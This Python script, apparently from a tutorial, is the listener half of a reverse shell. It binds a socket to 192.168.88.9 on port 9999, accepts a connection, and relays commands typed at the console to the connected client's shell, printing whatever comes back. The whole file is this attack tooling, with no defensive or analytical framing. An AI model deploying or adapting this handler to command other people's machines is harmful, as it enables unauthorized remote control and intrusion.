import socket
import sys

# Create socket
def create_socket():
    try:
        global host
        global port
        global s
        host = "192.168.88.9"
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print ("Socket creation error: "+ str(msg))

# Bind Socket and Listening for Connection
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the port "+ str(port))
        s.bind((host,port))
        s.listen(5) #number of bad connections it can tolerate

    except socket.error as msg:
        print ("Socket binding error: "+ str(msg) +"\n" + "Retrying...")
        bind_socket()

# Establish connection with a client (socket must be listening)
def socket_accept():
    conn, address = s.accept() #return object of conversattion and list of IP addresses and port
    print("Connection has been established!\n" + "IP: " + address[0] +"\n"+ "Port: " +str(address[1]))
    send_command(conn)
    conn.close()

# Sending commands to client shell
def send_command(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response, end ="")

def main():
    create_socket()
    bind_socket()
    socket_accept()

main()